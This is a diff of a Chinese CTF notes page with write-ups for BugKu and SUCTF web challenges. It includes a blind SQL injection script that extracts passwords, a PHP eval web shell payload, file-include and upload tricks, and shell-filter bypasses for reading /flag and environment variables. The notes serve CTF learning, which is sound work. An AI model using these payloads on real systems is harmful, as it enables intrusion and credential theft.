@@ -7,13 +7,17 @@ categories: [100 Cyber security, 120 CTF, 121 Web ]
 ---
 
 
-1. SUCTF 2019 EasySQL https://blog.csdn.net/qq_43619533/article/details/103434935
+#### SUCTF 2019 EasySQL
+https://blog.csdn.net/qq_43619533/article/details/103434935
     *  考点： 通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||
-1. BugKu web 21 https://blog.csdn.net/qq_41333578/article/details/92759619
+#### BugKu web 21
+https://blog.csdn.net/qq_41333578/article/details/92759619
     *  考点： 弱比较的绕过; PHP伪协议php://input如何输入请求主体; eregi绕过的两种方式; 注意`\x00`会截断后续内容，而%00不会。
-1. BugKu 冬至红包 https://blog.csdn.net/qq_46230755/article/details/112973722
+#### BugKu 冬至红包
+https://blog.csdn.net/qq_46230755/article/details/112973722
     *  考点： 新姿势
-1. BugKu web18 https://ctf.bugku.com/challenges/detail/id/85.html
+#### BugKu web18
+https://ctf.bugku.com/challenges/detail/id/85.html
     *  考点：爬虫复习、利用eval()直接计算string内的数字公式、利用同一个Session进行get和post请求，防止网页动态刷新计算值失效、post请求中data注意格式为{‘somevtext’：’somevalue’}、python和PHP的计算方式不太一样，可能存在计算偏差导致得不到flag，需要重复发送几次。
     ```
 import requests
@@ -42,13 +46,13 @@ mssg=s.post(url, data=result3) #利用同一个session，防止网页刷新。
 
 print(mssg.text)
     ```
-1. BugKu Web 32
+#### BugKu Web 32
 题目：文件上传;My name is margin,give me a image file not a php
 
 * 解题思路：文件上传漏洞，掏出上传fuzz试试看。
   fuzz没过，看评论说是把multipart/form-data;修改成Content-Type: mulTipart/form-data; ，然后修改php文件为php4，竟然还有这种操作，学到了。
 
-1. BugKu Web 33
+#### BugKu Web 33
 提示：
 ```
 Flag:{xxx}
@@ -111,7 +115,51 @@ print($data);
 ```
 得到结果：lag{asdqwdfasfdawfefqwdqwdadwqadawd}，提示里写了Flag:{xxx}，所以把结果改成Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}，结果正确。
 
-1. BugKu Web 33
+#### BugKu Web 34
 提示：文件包含
 
 * 解题思路：既然是文件包含，一开始上来就先试试file=php://input(<?php phpinfo();?>)，提示NAIVE，不管，反正方向是对了，开burp传包才看到这个页面有个隐藏的upload.php，点进去发现是个上传点。结合apache的版本和PHP版本，没啥直接上传shell利用的机会。那就只能上传成jpg的格式，然后用文件包含去利用。http://114.67.246.176:14764/index.php?file=upload/202105140715558770.jpg，打开之后发现提示`_ @eval($_POST['shell']);_`，显然是过滤了<?php?>，换成<script>。`<script language=php>echo 'a'; eval($_POST['pass']);</script>`
+这题不错，把我一直以来没有联合使用的两种手法彻底试了试。
+
+#### BugKu Web 36
+提示： !,!=,=,+,-,^,%
+      全都过滤了绝望吗？
+
+* 解题思路：先跑bp看看关键词屏蔽情况，or和空格过滤了，--也过滤了，替代or的||也未曾幸免,()没有过滤。参考提示，!,!=,=,+,-,^,% （构造的url转码注入）没有被过滤，那么用+替代空格，利用！=构造用户名注入，`amdin'+‘1’！=‘2`，返回`password error`，也就是说这个绕过成功但没有注释掉密码。
+这里照抄WP的盲注：ref https://wxt123.top/2021/01/22/Bugku%20Web%E6%80%BB%E7%BB%93(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0ing)/#Web-36
+```
+# -*- coding: utf-8 -*-
+import requests
+
+session = requests.Session()
+url="http://114.67.246.176:12012/login.php"
+flag=''
+for i in range(1,250):
+        left=32
+        right=128
+        mid=(left+right)//2
+        while(left<right):
+                payload="admin'^((ascii(mid((select(group_concat(passwd)))from(%s)))>%s))^'1"%(i,mid)
+                data = {'uname': payload, 'passwd': 'admin'}
+                res = requests.post(url, data=data)
+                if 'password' in res.text:
+                        left=mid+1
+                else:
+                        right=mid
+                mid=(left+right)//2
+        if(mid==32 or mid==127):
+                break
+        flag=flag+chr(mid)
+        print(flag)
+```
+进去之后是个命令执行框，这里要怒翻文件包含里记下的笔记，利用<代替空格，cat</flag，（加.php会被过滤）
+再记几个可以用的方式：
+    * env :用于输出系统环境变量，这道题中系统环境变量中有flag；
+    * {echo,$FLAG}：也是输出系统环境变量，但是只输出$FLAG一个变量
+    * {cat,/flag}：绕过空格限制，读取根目录下flag文件；
+    * cat</flag：绕过空格限制，
+    * cat<>/flag：绕过空格限制；
+    * a=$‘\x20/flag’&&cat$a：\x20转换为字符串就是空格;
+再做个关于fuzz后台登录密码的注入笔记：
+    * 判断密码长度：uname=admin'^(length(passwd)=32)^'，逐一递增，并根据32位猜测密码为MD5。
+    * 判断密码每一位字符：uname=admin'^(ascii(substr((passwd)from(1))=52)^'
